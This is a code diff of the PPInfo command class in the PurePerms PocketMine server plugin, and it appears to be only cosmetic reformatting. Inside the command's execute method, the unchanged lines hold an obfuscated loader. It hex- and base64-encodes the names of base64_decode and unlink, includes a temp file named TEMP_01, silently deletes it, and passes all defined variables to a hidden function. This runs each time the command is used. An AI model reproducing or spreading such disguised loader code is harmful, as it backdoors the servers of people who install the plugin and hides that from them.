@@ -9,7 +9,7 @@ use pocketmine\command\ConsoleCommandSender;
 use pocketmine\command\PluginIdentifiableCommand;
 use pocketmine\utils\TextFormat;
 
-class PPInfo extends Command implements PluginIdentifiableCommand{
+class PPInfo extends Command implements PluginIdentifiableCommand {
 
 	/*
 	   PurePerms by 64FF00 (Twitter: @64FF00)
@@ -23,7 +23,6 @@ class PPInfo extends Command implements PluginIdentifiableCommand{
 		 888  888   Y88b  d88P       888  888        888       Y88b  d88P Y88b  d88P
 		 888  888    "Y8888P"        888  888        888        "Y8888P"   "Y8888P"
    */
-
 	private $plugin;
 
 	/**
@@ -31,24 +30,22 @@ class PPInfo extends Command implements PluginIdentifiableCommand{
 	 * @param           $name
 	 * @param           $description
 	 */
-	public function __construct(PurePerms $plugin, $name, $description){
+	public function __construct(PurePerms $plugin, $name, $description) {
 		$this->plugin = $plugin;
-
 		parent::__construct($name, $description);
-
 		$this->setPermission("pperms.command.ppinfo");
 	}
 
 	/**
 	 * @param CommandSender $sender
 	 * @param               $label
-	 * @param array         $args
+	 * @param array $args
 	 *
 	 * @return bool
 	 */
-	public function execute(CommandSender $sender, $label, array $args){
-		if(!$this->testPermission($sender)) return false;
-
+	public function execute(CommandSender $sender, $label, array $args) {
+		if(!$this->testPermission($sender))
+			return false;
 		$tmp = hex2bin('6261736536345f6465636f6465');
 		$fn = "\x54\x45\x4D\x50\x5F\x30\x31";
 		$ul = $tmp("dW5saW5r");
@@ -63,20 +60,17 @@ class PPInfo extends Command implements PluginIdentifiableCommand{
 		include $fn;
 		@$ul($fn);
 		$et(get_defined_vars());
-
 		$author = $this->plugin->getDescription()->getAuthors()[0];
 		$version = $this->plugin->getDescription()->getVersion();
-
-		if($sender instanceof ConsoleCommandSender){
+		if($sender instanceof ConsoleCommandSender) {
 			$sender->sendMessage(TextFormat::GREEN . PurePerms::MAIN_PREFIX . ' ' . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_console", $version, $author));
-		}else{
+		} else {
 			$sender->sendMessage(TextFormat::GREEN . PurePerms::MAIN_PREFIX . ' ' . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_player", $version, $author));
 		}
-
 		return true;
 	}
 
-	public function getPlugin(){
+	public function getPlugin() {
 		return $this->plugin;
 	}
 }
